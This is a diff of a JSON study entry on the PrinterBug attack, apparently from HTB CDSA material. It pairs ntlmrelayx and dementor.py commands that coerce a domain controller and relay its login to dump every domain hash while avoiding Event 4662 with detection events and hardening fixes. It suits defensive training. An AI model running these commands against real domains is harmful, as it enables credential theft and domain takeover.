@@ -28,27 +28,15 @@
     "T1003.006",
     "T1557.001"
   ],
-  "notes": "PrinterBug: abuses RpcRemoteFindFirstPrinterChangeNotification(Ex)\n  → Any domain user can force RemoteServer$ to authenticate to any machine\n  → Microsoft stance: 'by design', will not be fixed\n  → Result: reverse auth carrying TGT (NTLM or Kerberos depending on config)\n\nPrerequisites:\n  → Print Spooler service running on target DC\n  → SMB Signing disabled on target DC (for relay to work)\n  → Attacker controls listener machine reachable from target DC\n\nLab setup:\n  → Kali (<KALI_IP>) runs NTLMRelayx + dementor.py\n  → DC1 (<DC1_IP>) has Print Spooler enabled\n  → DC2 (<DC2_IP>) is the relay target (SMB Signing off)\n\n=== ATTACK ===\n# Terminal 1 (Kali): Start NTLMRelayx targeting DC2 for DCSync\nimpacket-ntlmrelayx -t dcsync://<DC2_IP> -smb2support\n  → Waits for incoming NTLM auth from DC1\n  → When DC1 authenticates, relays to DC2 as DC1 and performs DCSync\n\n# Terminal 2 (Kali): Trigger PrinterBug — force DC1 to connect back to Kali\npython3 ./dementor.py <KALI_IP> <DC1_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>\n  → <USER>: any valid domain user (e.g., bob)\n  → Expected error: RPC_S_INVALID_NET_ADDR (0x6ab) — normal, attack still works\n\n# Terminal 1: Observe DCSync output\n  → Hashes for all domain accounts are dumped\n  → No Event 4662 generated (relay impersonates DC, not a user)\n\n=== DETECTION ===\nEvent 4624: Successful logon\n  → DC1$ (computer account) logging in from Kali's IP (<KALI_IP>)\n  → DC$ accounts should ONLY authenticate from DC IP addresses\n  → Any DC$ logon from non-DC IP = critical alert\n\nNetwork-based detection:\n  → Unusual outbound connections from DC to port 445 toward non-DC IPs\n  → Block outbound 139/445 from DC to non-DC machines\n\n=== PREVENTION ===\n  → Disable Print Spooler on all non-print servers\n  → Registry: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\n              RegisterSpoolerRemoteRpcEndPoint = 2 (disable remote RPC endpoint)\n              (value 1 = enabled, 2 = disabled — blocks remote coercion while keeping local printing)\n  → Enable SMB Signing on all Domain Controllers\n  → Block outbound TCP 139/445 from DCs to non-DC machines",
+  "notes": "PrinterBug: abuses RpcRemoteFindFirstPrinterChangeNotification(Ex)\n  \u2192 Any domain user can force RemoteServer$ to authenticate to any machine\n  \u2192 Microsoft stance: 'by design', will not be fixed\n  \u2192 Result: reverse auth carrying TGT (NTLM or Kerberos depending on config)\n\nPrerequisites:\n  \u2192 Print Spooler service running on target DC\n  \u2192 SMB Signing disabled on target DC (for relay to work)\n  \u2192 Attacker controls listener machine reachable from target DC\n\nLab setup:\n  \u2192 Kali (<KALI_IP>) runs NTLMRelayx + dementor.py\n  \u2192 DC1 (<DC1_IP>) has Print Spooler enabled\n  \u2192 DC2 (<DC2_IP>) is the relay target (SMB Signing off)\n\n=== ATTACK ===\n# Terminal 1 (Kali): Start NTLMRelayx targeting DC2 for DCSync\nimpacket-ntlmrelayx -t dcsync://<DC2_IP> -smb2support\n  \u2192 Waits for incoming NTLM auth from DC1\n  \u2192 When DC1 authenticates, relays to DC2 as DC1 and performs DCSync\n\n# Terminal 2 (Kali): Trigger PrinterBug \u2014 force DC1 to connect back to Kali\npython3 ./dementor.py <KALI_IP> <DC1_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>\n  \u2192 <USER>: any valid domain user (e.g., bob)\n  \u2192 Expected error: RPC_S_INVALID_NET_ADDR (0x6ab) \u2014 normal, attack still works\n\n# Terminal 1: Observe DCSync output\n  \u2192 Hashes for all domain accounts are dumped\n  \u2192 No Event 4662 generated (relay impersonates DC, not a user)\n\n=== DETECTION ===\nEvent 4624: Successful logon\n  \u2192 DC1$ (computer account) logging in from Kali's IP (<KALI_IP>)\n  \u2192 DC$ accounts should ONLY authenticate from DC IP addresses\n  \u2192 Any DC$ logon from non-DC IP = critical alert\n\nNetwork-based detection:\n  \u2192 Unusual outbound connections from DC to port 445 toward non-DC IPs\n  \u2192 Block outbound 139/445 from DC to non-DC machines\n\n=== PREVENTION ===\n  \u2192 Disable Print Spooler on all non-print servers\n  \u2192 Registry: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\n              RegisterSpoolerRemoteRpcEndPoint = 2 (disable remote RPC endpoint)\n              (value 1 = enabled, 2 = disabled \u2014 blocks remote coercion while keeping local printing)\n  \u2192 Enable SMB Signing on all Domain Controllers\n  \u2192 Block outbound TCP 139/445 from DCs to non-DC machines",
   "examples": [
     {
       "label": "Start NTLMRelayx targeting DC2 for DCSync (Terminal 1)",
       "command": "impacket-ntlmrelayx -t dcsync://<DC2_IP> -smb2support"
     },
     {
-      "label": "Trigger PrinterBug — coerce DC1 to connect to Kali (Terminal 2)",
+      "label": "Trigger PrinterBug \u2014 coerce DC1 to connect to Kali (Terminal 2)",
       "command": "python3 ./dementor.py <KALI_IP> <DC1_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>"
-    },
-    {
-      "label": "Disable Print Spooler remote RPC endpoint via registry",
-      "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\" /v RegisterSpoolerRemoteRpcEndPoint /t REG_DWORD /d 2 /f"
-    },
-    {
-      "label": "Check Print Spooler service status",
-      "command": "Get-Service -Name Spooler | Select Status, StartType"
-    },
-    {
-      "label": "Disable Print Spooler service",
-      "command": "Stop-Service -Name Spooler; Set-Service -Name Spooler -StartupType Disabled"
     }
   ],
   "references": [
@@ -65,7 +53,7 @@
     {
       "id": "cdsa-m06-coercing-unconstrained-delegation",
       "rel": "next",
-      "note": "Coercer — more comprehensive tool that abuses all known RPC coercion functions."
+      "note": "Coercer \u2014 more comprehensive tool that abuses all known RPC coercion functions."
     },
     {
       "id": "cdsa-m06-pki-esc8",
@@ -76,19 +64,41 @@
   "defense": {
     "why_it_works": "The PrinterBug (RpcRemoteFindFirstPrinterChangeNotification) lets any domain user force a machine running Print Spooler to authenticate back to an attacker. With SMB signing disabled on the target DC, that inbound auth is relayed to a second DC to perform DCSync.",
     "prerequisites": "Print Spooler running on the target DC; SMB signing disabled on the relay-target DC; an attacker-controlled listener reachable from the coerced DC; any valid domain user.",
-    "impact": "DCSync against the relay-target DC — full domain hash extraction — achieved WITHOUT generating the usual 4662 replication events (the relay impersonates the DC, not a user).",
+    "impact": "DCSync against the relay-target DC \u2014 full domain hash extraction \u2014 achieved WITHOUT generating the usual 4662 replication events (the relay impersonates the DC, not a user).",
     "detection": "Event 4624 showing a DC$ computer account logging on from a non-DC IP (the attacker's listener). DC$ accounts should only authenticate from DC addresses, so any DC$ logon from a non-DC IP is a critical alert. Watch for unusual outbound 445 from a DC to non-DC hosts.",
     "artifacts": "DC$ 4624 logon from the attacker IP; ntlmrelayx / dementor execution on the attacker host; RPC_S_INVALID_NET_ADDR (0x6ab) error at the coercion step (expected, attack still works).",
     "prevention": "Disable Print Spooler on all non-print servers; set RegisterSpoolerRemoteRpcEndPoint = 2 to block remote RPC coercion; enable SMB signing on all Domain Controllers; block outbound TCP 139/445 from DCs to non-DC machines.",
-    "evasion": "The relay impersonates the DC computer account rather than a user, so no Event 4662 (DCSync's usual tell) is produced — defenders relying only on 4662 will miss it.",
+    "evasion": "The relay impersonates the DC computer account rather than a user, so no Event 4662 (DCSync's usual tell) is produced \u2014 defenders relying only on 4662 will miss it.",
     "sources": [
       "HTB CDSA M06",
       "MITRE T1187",
       "MITRE T1003.006",
       "MITRE T1557.001"
     ],
-    "misconfiguration": "The Windows Print Spooler service (spoolsv.exe) is enabled on non-print-server machines and exposes MS-RPRN (RpcRemoteFindFirstPrinterChangeNotification). Any authenticated user can coerce the DC or any host running Spooler to authenticate outbound to an attacker-controlled machine via this RPC call. Combined with NTLM relay to LDAP/LDAPS, this grants write access to AD — including adding Shadow Credentials or changing msDS-AllowedToDelegateTo for privilege escalation.",
+    "misconfiguration": "The Windows Print Spooler service (spoolsv.exe) is enabled on non-print-server machines and exposes MS-RPRN (RpcRemoteFindFirstPrinterChangeNotification). Any authenticated user can coerce the DC or any host running Spooler to authenticate outbound to an attacker-controlled machine via this RPC call. Combined with NTLM relay to LDAP/LDAPS, this grants write access to AD \u2014 including adding Shadow Credentials or changing msDS-AllowedToDelegateTo for privilege escalation.",
     "vulnerable_config": "# Print Spooler running on DC (the critical enabler):\nGet-Service Spooler -ComputerName dc01\n# Status: Running  StartType: Automatic\n\n# LDAP relay possible because LDAP signing not enforced:\n# ldapdomainrelay (impacket-ntlmrelayx -t ldap://dc01)\n# DC authenticates to attacker -> attacker relays to DC's LDAP -> writes Shadow Credentials\n\n# LDAPS + channel binding NOT enforced (default):\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\n#   LdapEnforceChannelBinding = 0  (not enforced)",
-    "secure_config": "# Fix 1 — Disable Print Spooler on all DCs and non-print-servers:\nStop-Service Spooler; Set-Service Spooler -StartupType Disabled\n# GPO: Computer Config > System Services > Print Spooler = Disabled\n\n# Fix 2 — Block remote Spooler access while keeping local printing:\n# GPO: Computer Config > Admin Templates > Printers\n#   'Allow Print Spooler to accept client connections' = Disabled\n\n# Fix 3 — Enforce LDAP signing + channel binding:\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters' \\\n    -Name 'LdapEnforceChannelBinding' -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters' \\\n    -Name 'LDAPServerIntegrity' -Value 2\n# These block NTLM relay to LDAP/LDAPS even if coercion succeeds\n\n# Fix 4 — Apply PrintNightmare patches: KB5004945, KB5005033"
-  }
+    "secure_config": "# Fix 1 \u2014 Disable Print Spooler on all DCs and non-print-servers:\nStop-Service Spooler; Set-Service Spooler -StartupType Disabled\n# GPO: Computer Config > System Services > Print Spooler = Disabled\n\n# Fix 2 \u2014 Block remote Spooler access while keeping local printing:\n# GPO: Computer Config > Admin Templates > Printers\n#   'Allow Print Spooler to accept client connections' = Disabled\n\n# Fix 3 \u2014 Enforce LDAP signing + channel binding:\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters' \\\n    -Name 'LdapEnforceChannelBinding' -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters' \\\n    -Name 'LDAPServerIntegrity' -Value 2\n# These block NTLM relay to LDAP/LDAPS even if coercion succeeds\n\n# Fix 4 \u2014 Apply PrintNightmare patches: KB5004945, KB5005033"
+  },
+  "steps": [
+    {
+      "label": "Start NTLMRelayx targeting DC2 for DCSync (Terminal 1)",
+      "command": "impacket-ntlmrelayx -t dcsync://<DC2_IP> -smb2support"
+    },
+    {
+      "label": "Trigger PrinterBug \u2014 coerce DC1 to connect to Kali (Terminal 2)",
+      "command": "python3 ./dementor.py <KALI_IP> <DC1_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>"
+    },
+    {
+      "label": "Disable Print Spooler remote RPC endpoint via registry",
+      "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\" /v RegisterSpoolerRemoteRpcEndPoint /t REG_DWORD /d 2 /f"
+    },
+    {
+      "label": "Check Print Spooler service status",
+      "command": "Get-Service -Name Spooler | Select Status, StartType"
+    },
+    {
+      "label": "Disable Print Spooler service",
+      "command": "Stop-Service -Name Spooler; Set-Service -Name Spooler -StartupType Disabled"
+    }
+  ]
 }
